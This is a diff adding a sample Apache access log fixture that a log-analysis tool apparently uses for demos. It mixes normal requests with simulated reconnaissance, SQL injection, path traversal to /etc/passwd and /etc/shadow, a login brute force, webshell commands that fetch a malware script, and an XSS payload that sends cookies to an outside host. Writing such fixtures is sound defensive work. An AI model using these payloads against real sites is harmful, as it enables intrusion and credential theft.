@@ -1,0 +1,63 @@
+# Sample Apache access log — contains various attack patterns for demo/testing
+# This file is used by: python -m sentinelai demo
+# and: python -m sentinelai analyse --logs ./sample_logs/apache_attacks.log
+
+# Normal traffic
+192.168.1.100 - alice [22/Jun/2026:09:00:01 +0000] "GET / HTTP/1.1" 200 1234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+192.168.1.100 - alice [22/Jun/2026:09:00:05 +0000] "GET /about HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+192.168.1.101 - bob [22/Jun/2026:09:01:00 +0000] "GET /dashboard HTTP/1.1" 200 4521 "-" "Mozilla/5.0 (Macintosh)"
+
+# Reconnaissance phase — scanner detected
+45.33.32.156 - - [22/Jun/2026:10:15:00 +0000] "GET /robots.txt HTTP/1.1" 200 89 "-" "Nikto/2.1.6"
+45.33.32.156 - - [22/Jun/2026:10:15:01 +0000] "GET /admin HTTP/1.1" 404 512 "-" "Nikto/2.1.6"
+45.33.32.156 - - [22/Jun/2026:10:15:02 +0000] "GET /admin/ HTTP/1.1" 403 512 "-" "Nikto/2.1.6"
+45.33.32.156 - - [22/Jun/2026:10:15:03 +0000] "GET /.env HTTP/1.1" 404 512 "-" "Nikto/2.1.6"
+45.33.32.156 - - [22/Jun/2026:10:15:04 +0000] "GET /wp-config.php HTTP/1.1" 404 512 "-" "Nikto/2.1.6"
+45.33.32.156 - - [22/Jun/2026:10:15:05 +0000] "GET /config.php HTTP/1.1" 404 512 "-" "Nikto/2.1.6"
+45.33.32.156 - - [22/Jun/2026:10:15:06 +0000] "GET /backup.zip HTTP/1.1" 404 512 "-" "Nikto/2.1.6"
+
+# SQL injection attempts
+203.0.113.42 - - [22/Jun/2026:10:30:00 +0000] "GET /search?q=test HTTP/1.1" 200 2341 "-" "sqlmap/1.7.8"
+203.0.113.42 - - [22/Jun/2026:10:30:01 +0000] "GET /search?q=1' HTTP/1.1" 500 892 "-" "sqlmap/1.7.8"
+203.0.113.42 - - [22/Jun/2026:10:30:02 +0000] "GET /search?q=1 UNION SELECT null,null,null-- HTTP/1.1" 500 892 "-" "sqlmap/1.7.8"
+203.0.113.42 - - [22/Jun/2026:10:30:03 +0000] "GET /search?q=1 UNION SELECT username,password,null FROM users-- HTTP/1.1" 500 1024 "-" "sqlmap/1.7.8"
+203.0.113.42 - - [22/Jun/2026:10:30:04 +0000] "GET /search?q=1' OR '1'='1 HTTP/1.1" 200 3421 "-" "sqlmap/1.7.8"
+
+# Path traversal
+203.0.113.42 - - [22/Jun/2026:10:31:00 +0000] "GET /../../../etc/passwd HTTP/1.1" 403 256 "-" "curl/7.81.0"
+203.0.113.42 - - [22/Jun/2026:10:31:01 +0000] "GET /../../../../etc/shadow HTTP/1.1" 403 256 "-" "curl/7.81.0"
+203.0.113.42 - - [22/Jun/2026:10:31:02 +0000] "GET /%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1" 403 256 "-" "curl/7.81.0"
+
+# Brute force on login
+198.51.100.73 - - [22/Jun/2026:11:00:00 +0000] "POST /login HTTP/1.1" 401 512 "-" "python-requests/2.31.0"
+198.51.100.73 - - [22/Jun/2026:11:00:01 +0000] "POST /login HTTP/1.1" 401 512 "-" "python-requests/2.31.0"
+198.51.100.73 - - [22/Jun/2026:11:00:02 +0000] "POST /login HTTP/1.1" 401 512 "-" "python-requests/2.31.0"
+198.51.100.73 - - [22/Jun/2026:11:00:03 +0000] "POST /login HTTP/1.1" 401 512 "-" "python-requests/2.31.0"
+198.51.100.73 - - [22/Jun/2026:11:00:04 +0000] "POST /login HTTP/1.1" 401 512 "-" "python-requests/2.31.0"
+198.51.100.73 - - [22/Jun/2026:11:00:05 +0000] "POST /login HTTP/1.1" 401 512 "-" "python-requests/2.31.0"
+198.51.100.73 - - [22/Jun/2026:11:00:06 +0000] "POST /login HTTP/1.1" 401 512 "-" "python-requests/2.31.0"
+198.51.100.73 - - [22/Jun/2026:11:00:07 +0000] "POST /login HTTP/1.1" 401 512 "-" "python-requests/2.31.0"
+198.51.100.73 - - [22/Jun/2026:11:00:08 +0000] "POST /login HTTP/1.1" 401 512 "-" "python-requests/2.31.0"
+198.51.100.73 - - [22/Jun/2026:11:00:09 +0000] "POST /login HTTP/1.1" 401 512 "-" "python-requests/2.31.0"
+198.51.100.73 - - [22/Jun/2026:11:00:10 +0000] "POST /login HTTP/1.1" 401 512 "-" "python-requests/2.31.0"
+198.51.100.73 - - [22/Jun/2026:11:00:11 +0000] "POST /login HTTP/1.1" 401 512 "-" "python-requests/2.31.0"
+198.51.100.73 - - [22/Jun/2026:11:00:12 +0000] "POST /login HTTP/1.1" 401 512 "-" "python-requests/2.31.0"
+198.51.100.73 - - [22/Jun/2026:11:00:13 +0000] "POST /login HTTP/1.1" 401 512 "-" "python-requests/2.31.0"
+198.51.100.73 - - [22/Jun/2026:11:00:14 +0000] "POST /login HTTP/1.1" 401 512 "-" "python-requests/2.31.0"
+198.51.100.73 - - [22/Jun/2026:11:00:15 +0000] "POST /login HTTP/1.1" 401 512 "-" "python-requests/2.31.0"
+198.51.100.73 - - [22/Jun/2026:11:00:16 +0000] "POST /login HTTP/1.1" 401 512 "-" "python-requests/2.31.0"
+198.51.100.73 - - [22/Jun/2026:11:00:17 +0000] "POST /login HTTP/1.1" 401 512 "-" "python-requests/2.31.0"
+198.51.100.73 - - [22/Jun/2026:11:00:18 +0000] "POST /login HTTP/1.1" 401 512 "-" "python-requests/2.31.0"
+198.51.100.73 - - [22/Jun/2026:11:00:19 +0000] "POST /login HTTP/1.1" 401 512 "-" "python-requests/2.31.0"
+198.51.100.73 - - [22/Jun/2026:11:00:20 +0000] "POST /login HTTP/1.1" 200 2341 "-" "python-requests/2.31.0"
+
+# Post-compromise — webshell access
+198.51.100.73 - - [22/Jun/2026:11:05:00 +0000] "GET /uploads/shell.php HTTP/1.1" 200 156 "-" "curl/7.81.0"
+198.51.100.73 - - [22/Jun/2026:11:05:10 +0000] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 89 "-" "curl/7.81.0"
+198.51.100.73 - - [22/Jun/2026:11:05:15 +0000] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 67 "-" "curl/7.81.0"
+198.51.100.73 - - [22/Jun/2026:11:05:20 +0000] "GET /uploads/shell.php?cmd=cat+/etc/passwd HTTP/1.1" 200 1892 "-" "curl/7.81.0"
+198.51.100.73 - - [22/Jun/2026:11:05:30 +0000] "GET /uploads/shell.php?cmd=wget+http://198.51.100.73/malware.sh HTTP/1.1" 200 156 "-" "curl/7.81.0"
+
+# XSS attempt
+172.16.0.50 - - [22/Jun/2026:12:00:00 +0000] "GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1" 200 892 "-" "Mozilla/5.0"
+172.16.0.50 - - [22/Jun/2026:12:00:01 +0000] "GET /search?q=<img src=x onerror=fetch('http://172.16.0.50/?c='+document.cookie)> HTTP/1.1" 200 892 "-" "Mozilla/5.0"
